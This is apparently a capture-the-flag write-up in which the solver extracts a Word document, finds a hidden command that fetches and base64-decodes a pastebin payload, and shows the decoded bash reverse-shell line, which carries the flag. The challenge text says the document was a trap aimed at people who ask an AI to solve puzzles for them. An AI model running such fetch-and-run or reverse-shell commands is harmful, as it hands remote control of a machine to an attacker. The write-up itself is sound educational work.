# tldr please summarise

## Description
```
I thought I was being 1337 by asking AI to help me solve challenges, now I have to reinstall Windows again. 
Can you help me out by find the flag in this document?
```

## Provided Files
```
- EmuWar.docx
```

## Writeup

Starting off, I extracted all elements using basic linux utility. <br/>
```sh
$ binwalk -e EmuWar.docx 
```

Searching through extracted files using linux utility. <br/>
```sh
$ find ./ -type f -exec strings {} + | grep "DU"
$ find ./ -type f -exec strings {} + | grep http

--------------------
curl -sL https://pastebin.com/raw/ysYcKmbu | base64 -d
--------------------
```

To extract the flag I simply used another `curl` request to the used endpoint which concludes this writeup. <br/>
```sh
$ curl https://pastebin.com/raw/ysYcKmbu | base64 -d

bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1
```

